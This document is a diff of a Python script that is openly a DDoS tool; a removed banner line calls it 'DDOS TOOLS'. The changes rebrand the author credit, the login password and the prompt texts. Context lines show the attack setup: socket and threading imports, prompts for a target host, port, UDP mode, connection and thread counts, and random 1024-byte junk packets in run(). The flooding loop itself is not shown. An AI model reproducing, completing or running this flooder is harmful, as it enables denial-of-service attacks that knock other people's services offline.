@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#Code by Traxz
+#Codeid By XD3MP;SAMP
 import random
 import socket
 import threading
@@ -7,7 +7,7 @@ import time
 import os
 
 #login tools
-password ="XD V2"
+password ="NUKLIR SAMP"
 
 print("""\u001b[35m                              
 ██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
@@ -22,11 +22,11 @@ for i in range(3):
 	j=3
 	if(pwd==password):
 		time.sleep(5)
-		print("[ + ] Please Wait!!! ")
+		print("[ + ] Please Security To Password!!! ")
 		break
 	else:
 		time.sleep(5)
-		print("\u001b[31m[ × ] Wrong Password!!! ")
+		print("\u001b[31m[ × ] Wrong IS Security Password!!! ")
 		continue
 time.sleep(5)
 print("\u001b[35m{ √ } Successfully Loginned")
@@ -35,7 +35,7 @@ os.system("clear")
 
 print("""
 \u001b[35m
-DDOS TOOLS BY XD3MP:SAMP
+Codeid By XD3MP;SAMP
 
 ██╗░░██╗██████╗░███████╗███╗░░░███╗██████╗░
 ╚██╗██╔╝██╔══██╗██╔════╝████╗░████║██╔══██╗
@@ -53,11 +53,11 @@ time.sleep(2)
 
 os.system("clear")
 
-ip = str(input("\u001b[37m[ + ] HOST/IP :\u001b[35m    "))
-port = int(input("\u001b[37m[ + ] PORT:\u001b[35m     "))
-choice = str(input("\u001b[37m[ + ] UDP(y/n) :\u001b[35m  "))
+ip = str(input("\u001b[37m[ + ] ENTER | HOST/IP :\u001b[35m    "))
+port = int(input("\u001b[37m[ + ] ENTER | PORT:\u001b[35m     "))
+choice = str(input("\u001b[37m[ + ] ENTER | UDP(y/n) :\u001b[35m  "))
 times = int(input("\u001b[37m[ + ] CONNECTIONS :\u001b[35m  "))
-threads = int(input("\u001b[37m[ + ] THREADS :\u001b[35m  "))
+threads = int(input("\u001b[37m[ + ] ENTER | THREADS :\u001b[35m  "))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[ 1 ]","[ 2 ]","[ 3 ]"))
